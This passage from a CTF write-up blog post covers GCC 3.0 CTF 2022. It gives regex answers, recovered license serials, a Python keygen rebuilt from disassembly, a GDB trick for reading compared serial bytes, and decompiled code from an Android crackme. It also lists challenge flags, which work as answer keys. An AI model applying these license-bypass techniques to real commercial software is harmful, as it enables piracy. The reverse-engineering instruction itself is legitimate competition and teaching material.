<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>GCC 3.0 CTF 2022 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="GCC 3.0 CTF 2022" />
<meta property="og:description" content="Writeup for GCC 3.0 CTF 2022 by Chovid99" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/gcc-3.0-ctf-2022/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-01-11T06:36:00+07:00" />
<meta property="article:modified_time" content="2023-02-24T14:07:40+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png"/>

<meta name="twitter:title" content="GCC 3.0 CTF 2022"/>
<meta name="twitter:description" content="Writeup for GCC 3.0 CTF 2022 by Chovid99"/>
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/gcc-3.0-ctf-2022/" /><link rel="prev" href="https://chovid99.github.io/posts/pbctf-2021/" /><link rel="next" href="https://chovid99.github.io/posts/dicectf-2022/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "GCC 3.0 CTF 2022",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/gcc-3.0-ctf-2022\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, GCC CTF, jsp, web, pwn, android, short-pwn, rop, got overwrite, 2022","wordcount":  2106 ,
        "url": "https:\/\/chovid99.github.io\/posts\/gcc-3.0-ctf-2022\/","datePublished": "2022-01-11T06:36:00+07:00","dateModified": "2023-02-24T14:07:40+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Chovid99"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">GCC 3.0 CTF 2022</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Jan 11, 2022">Jan 11, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2106 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;10 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#rev">Rev</a>
      <ul>
        <li><a href="#regexp-challenge">Regexp Challenge</a></li>
        <li><a href="#license-key-level-1">License Key Level 1</a></li>
        <li><a href="#license-key-level-2">License Key Level 2</a></li>
        <li><a href="#license-key-level-3">License Key Level 3</a></li>
        <li><a href="#license-key-level-4">License Key Level 4</a></li>
        <li><a href="#crack-me-android">Crack me Android</a></li>
      </ul>
    </li>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#plupload">PLUpload</a></li>
      </ul>
    </li>
    <li><a href="#misc">Misc</a>
      <ul>
        <li><a href="#ctf-spray-attack-ssh">CTF Spray Attack SSH</a></li>
        <li><a href="#ctf-spray-attack-http">CTF Spray Attack HTTP</a></li>
      </ul>
    </li>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#crysys">CrySYS</a></li>
      </ul>
    </li>
    <li><a href="#crypto">Crypto</a>
      <ul>
        <li><a href="#idbased1">IDBased1</a></li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://pbs.twimg.com/media/FIxy9OTVcAA79W-?format=jpg&amp;name=4096x4096"
        data-srcset="https://pbs.twimg.com/media/FIxy9OTVcAA79W-?format=jpg&amp;name=4096x4096, https://pbs.twimg.com/media/FIxy9OTVcAA79W-?format=jpg&amp;name=4096x4096 1.5x, https://pbs.twimg.com/media/FIxy9OTVcAA79W-?format=jpg&amp;name=4096x4096 2x"
        data-sizes="auto"
        alt="https://pbs.twimg.com/media/FIxy9OTVcAA79W-?format=jpg&amp;name=4096x4096"
        title="https://pbs.twimg.com/media/FIxy9OTVcAA79W-?format=jpg&amp;name=4096x4096" /></p>
<p>I&rsquo;m super happy on writing this writeup becaue I managed to qualify to join the final of GCC 3.0 2022. Here is my writeup for challenges that I solved during qualification. (Edit: I got third place on the final :D).</p>
<h1 id="rev">Rev</h1>
<h2 id="regexp-challenge">Regexp Challenge</h2>
<p>We just need to craft manually our regex per level</p>
<ul>
<li>Level 1
<ul>
<li><code>\d{8}\D{1}</code></li>
</ul>
</li>
<li>Level 2
<ul>
<li><code>^[1,2,3,4,8,9]\D{1}</code></li>
</ul>
</li>
<li>Level 3
<ul>
<li><code>\d{8}[A]{1}</code></li>
</ul>
</li>
<li>Level 4
<ul>
<li><code>7{7,}[A]</code></li>
</ul>
</li>
<li>Level 5
<ul>
<li><code>.*A</code></li>
</ul>
</li>
<li>Level 6
<ul>
<li><code>\d*A</code></li>
</ul>
</li>
<li>Level 7
<ul>
<li><code>\d*\D</code></li>
</ul>
</li>
<li>Level 8
<ul>
<li><code>\d*[c,h,W,A]</code></li>
</ul>
</li>
<li>Level 9
<ul>
<li><code>[^-]+</code></li>
</ul>
</li>
<li>Level 10
<ul>
<li><code>\D{1}-{1}\d{6}\D</code></li>
</ul>
</li>
<li>Level 11
<ul>
<li><code>\D{1}-{1}\d{3,5}\D</code></li>
</ul>
</li>
<li>Level 12
<ul>
<li><code>\D{1}(-|\+){1}\d{6}\D</code></li>
</ul>
</li>
<li>Level 13
<ul>
<li><code>\d{2}\D?\d{5}\D</code></li>
</ul>
</li>
<li>Level 14
<ul>
<li><code>\d{2}\D?\d{1,3}\D</code></li>
</ul>
</li>
<li>Level 15
<ul>
<li><code>((\D\+\d{4,6}\D)|(\D-\d{4}\D))</code></li>
</ul>
</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/s6HIwQF.png"
        data-srcset="https://i.imgur.com/s6HIwQF.png, https://i.imgur.com/s6HIwQF.png 1.5x, https://i.imgur.com/s6HIwQF.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/s6HIwQF.png"
        title="https://i.imgur.com/s6HIwQF.png" /></p>
<blockquote>
<p>Flag: HL{RegExp-Tyc00n-91234}</p>
</blockquote>
<h2 id="license-key-level-1">License Key Level 1</h2>
<p>Serial key was found in this verify function
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/9rnmPs1.png"
        data-srcset="https://i.imgur.com/9rnmPs1.png, https://i.imgur.com/9rnmPs1.png 1.5x, https://i.imgur.com/9rnmPs1.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/9rnmPs1.png"
        title="https://i.imgur.com/9rnmPs1.png" /></p>
<blockquote>
<p>Flag: SYIOKLELUIOD</p>
</blockquote>
<h2 id="license-key-level-2">License Key Level 2</h2>
<p>The calculated serial was printed in the terminal, so we can simply use it as the flag.
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/Eql3bup.png"
        data-srcset="https://i.imgur.com/Eql3bup.png, https://i.imgur.com/Eql3bup.png 1.5x, https://i.imgur.com/Eql3bup.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/Eql3bup.png"
        title="https://i.imgur.com/Eql3bup.png" /></p>
<blockquote>
<p>Flag: LBQXULNJPXDE</p>
</blockquote>
<h2 id="license-key-level-3">License Key Level 3</h2>
<p>Checking the disassembly code</p>
<figure><a class="lightgallery" href="https://i.imgur.com/m2exSD6.png" title="https://i.imgur.com/m2exSD6.png" data-thumbnail="https://i.imgur.com/m2exSD6.png" data-sub-html="<h2>From the above image, we found the key</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/m2exSD6.png"
            data-srcset="https://i.imgur.com/m2exSD6.png, https://i.imgur.com/m2exSD6.png 1.5x, https://i.imgur.com/m2exSD6.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/m2exSD6.png" />
    </a><figcaption class="image-caption">From the above image, we found the key</figcaption>
    </figure>
<figure><a class="lightgallery" href="https://i.imgur.com/LjvB31F.png" title="https://i.imgur.com/LjvB31F.png" data-thumbnail="https://i.imgur.com/LjvB31F.png" data-sub-html="<h2>From the above image, we found the logic to generate the serial</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/LjvB31F.png"
            data-srcset="https://i.imgur.com/LjvB31F.png, https://i.imgur.com/LjvB31F.png 1.5x, https://i.imgur.com/LjvB31F.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/LjvB31F.png" />
    </a><figcaption class="image-caption">From the above image, we found the logic to generate the serial</figcaption>
    </figure>
<p>Just translate it into python</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;yrtxgfh;olmn&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">name</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;cyberpeace&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">serial</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">12</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">serial</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(((</span><span class="n">key</span><span class="p">[(</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">%</span> <span class="mi">12</span><span class="p">]</span><span class="o">^</span><span class="n">name</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">name</span><span class="p">)])</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x19</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;B&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">serial</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Flag: FDVDRRNKRDYG</p>
</blockquote>
<h2 id="license-key-level-4">License Key Level 4</h2>
<p>After reading the disassembly code, we know that the serial char comparison happens at this address
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/AlN45NT.png"
        data-srcset="https://i.imgur.com/AlN45NT.png, https://i.imgur.com/AlN45NT.png 1.5x, https://i.imgur.com/AlN45NT.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/AlN45NT.png"
        title="https://i.imgur.com/AlN45NT.png" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  40752d:	44 38 2c 18          	cmp    BYTE PTR [rax+rbx*1],r13b
</span></span></code></pre></td></tr></table>
</div>
</div><p>With the help of GDB, we can simply set breakpoints on it, and retrieve the r13 value. We got our serial key after retrieving the r13 value 12 times.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/U7UlzGH.png"
        data-srcset="https://i.imgur.com/U7UlzGH.png, https://i.imgur.com/U7UlzGH.png 1.5x, https://i.imgur.com/U7UlzGH.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/U7UlzGH.png"
        title="https://i.imgur.com/U7UlzGH.png" /></p>
<blockquote>
<p>Flag: GEIJBLDJDECA</p>
</blockquote>
<h2 id="crack-me-android">Crack me Android</h2>
<p>I got an apk file, and I try to decompile it with the help of JDK. After reading the result I found the login code in the LoginViewModel.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">login</span><span class="o">(</span><span class="n">String</span> <span class="n">str</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">checkHooking</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="o">.</span><span class="na">loginResult</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="k">new</span> <span class="n">LoginResult</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">((</span><span class="kt">int</span><span class="o">)</span> <span class="n">R</span><span class="o">.</span><span class="na">string</span><span class="o">.</span><span class="na">must_not_hook</span><span class="o">)));</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">int</span><span class="o">[]</span> <span class="n">checkPw</span> <span class="o">=</span> <span class="n">checkPw</span><span class="o">(</span><span class="n">getCode</span><span class="o">(</span><span class="n">str</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">checkPw</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="o">.</span><span class="na">loginResult</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="k">new</span> <span class="n">LoginResult</span><span class="o">(</span><span class="k">new</span> <span class="n">LoggedInUser</span><span class="o">(</span><span class="n">getStringFromCode</span><span class="o">(</span><span class="n">checkPw</span><span class="o">),</span> <span class="s">&#34;Well done you did it.&#34;</span><span class="o">)));</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="o">.</span><span class="na">loginResult</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="k">new</span> <span class="n">LoginResult</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">((</span><span class="kt">int</span><span class="o">)</span> <span class="n">R</span><span class="o">.</span><span class="na">string</span><span class="o">.</span><span class="na">login_failed</span><span class="o">)));</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">unused</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="o">.</span><span class="na">loginResult</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="k">new</span> <span class="n">LoginResult</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">((</span><span class="kt">int</span><span class="o">)</span> <span class="n">R</span><span class="o">.</span><span class="na">string</span><span class="o">.</span><span class="na">error_logging_in</span><span class="o">)));</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="n">x0</span> <span class="o">=</span> <span class="o">{</span><span class="mi">121</span><span class="o">,</span> <span class="mi">134</span><span class="o">,</span> <span class="mi">239</span><span class="o">,</span> <span class="mi">213</span><span class="o">,</span> <span class="mi">16</span><span class="o">,</span> <span class="mi">28</span><span class="o">,</span> <span class="mi">184</span><span class="o">,</span> <span class="mi">101</span><span class="o">,</span> <span class="mi">150</span><span class="o">,</span> <span class="mi">60</span><span class="o">,</span> <span class="mi">170</span><span class="o">,</span> <span class="mi">49</span><span class="o">,</span> <span class="mi">159</span><span class="o">,</span> <span class="mi">189</span><span class="o">,</span> <span class="mi">241</span><span class="o">,</span> <span class="mi">146</span><span class="o">,</span> <span class="mi">141</span><span class="o">,</span> <span class="mi">22</span><span class="o">,</span> <span class="mi">205</span><span class="o">,</span> <span class="mi">223</span><span class="o">,</span> <span class="mi">218</span><span class="o">,</span> <span class="mi">210</span><span class="o">,</span> <span class="mi">99</span><span class="o">,</span> <span class="mi">219</span><span class="o">,</span> <span class="mi">34</span><span class="o">,</span> <span class="mi">84</span><span class="o">,</span> <span class="mi">156</span><span class="o">,</span> <span class="mi">237</span><span class="o">,</span> <span class="mi">26</span><span class="o">,</span> <span class="mi">94</span><span class="o">,</span> <span class="mi">178</span><span class="o">,</span> <span class="mi">230</span><span class="o">,</span> <span class="mi">27</span><span class="o">,</span> <span class="mi">180</span><span class="o">,</span> <span class="mi">72</span><span class="o">,</span> <span class="mi">32</span><span class="o">,</span> <span class="mi">102</span><span class="o">,</span> <span class="mi">192</span><span class="o">,</span> <span class="mi">178</span><span class="o">,</span> <span class="mi">234</span><span class="o">,</span> <span class="mi">228</span><span class="o">,</span> <span class="mi">38</span><span class="o">,</span> <span class="mi">37</span><span class="o">,</span> <span class="mi">142</span><span class="o">,</span> <span class="mi">242</span><span class="o">,</span> <span class="mi">142</span><span class="o">,</span> <span class="mi">133</span><span class="o">,</span> <span class="mi">159</span><span class="o">,</span> <span class="mi">142</span><span class="o">,</span> <span class="mi">33</span><span class="o">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">getCode</span><span class="o">(</span><span class="n">String</span> <span class="n">str</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">str</span><span class="o">.</span><span class="na">getBytes</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span><span class="o">[]</span> <span class="n">iArr</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="n">str</span><span class="o">.</span><span class="na">length</span><span class="o">()];</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">str</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">iArr</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">bytes</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">^</span> <span class="n">x0</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">iArr</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Basically, what it do is our password will be xor-ed with the <code>x0</code> var, and then the result will be passed to native method called <code>checkPw</code>
I extract the native lib so file, and open it on Ghidra. With the help of JNIAnalyzer, I could deduce the password checker that was used in the <code>checkPw</code> method.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">jintArray</span> <span class="nf">Java_org_bfe_crackmenative_ui_LoginViewModel_checkPw</span>
</span></span><span class="line"><span class="cl">                    <span class="p">(</span><span class="n">JNIEnv</span> <span class="o">*</span><span class="n">env</span><span class="p">,</span><span class="n">jobject</span> <span class="n">thiz</span><span class="p">,</span><span class="n">jintArray</span> <span class="n">password</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">bool</span> <span class="n">bVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">bool</span> <span class="n">bVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">jintArray</span> <span class="n">new_arr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">jsize</span> <span class="n">password_length</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">__stream</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">pcVar3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">jint</span> <span class="o">*</span><span class="n">curr_char_pass</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">expected_char</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">jintArray</span> <span class="n">new_arr5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_1038</span> <span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_38</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_38</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">__android_log_write</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="s">&#34;Native Check&#34;</span><span class="p">,</span><span class="s">&#34;Checking password ...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">new_arr</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">NewIntArray</span><span class="p">)(</span><span class="n">env</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">password_length</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">GetArrayLength</span><span class="p">)(</span><span class="n">env</span><span class="p">,</span><span class="n">password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">new_arr5</span> <span class="o">=</span> <span class="n">new_arr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">password_length</span> <span class="o">==</span> <span class="mi">27</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">__stream</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/proc/self/maps&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">do</span> <span class="p">{</span>
